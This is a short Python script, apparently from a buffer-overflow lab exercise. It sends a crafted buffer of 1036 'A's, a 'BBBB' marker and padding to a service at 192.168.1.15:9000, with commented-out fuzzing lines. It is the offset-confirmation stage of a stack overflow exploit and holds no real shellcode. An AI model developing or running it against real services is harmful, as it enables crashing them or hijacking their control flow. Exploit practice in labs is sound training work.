#!/usr/bin/env python3

import socket, sys

ip = "192.168.1.15"

port = 9000
timeout = 5

shellcode = "A" * 1036
shellcode += "BBBB"
shellcode += "C" * 1024


try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        # s.recv(1024)
        # print("Fuzzing with {} bytes".format(len(shellcode) - len(prefix)))
        s.send(bytes(shellcode,  "latin-1"))
        # s.send(shellcode)
        # s.recv(1024)


except Exception as e:
    # By this way we can know about the type of error occurring
    print("The error connect the server is: ",e)
    # print("Fuzzing crashed at {} bytes".format(len(shellcode) - len(prefix)))
    sys.exit(0)

  
  





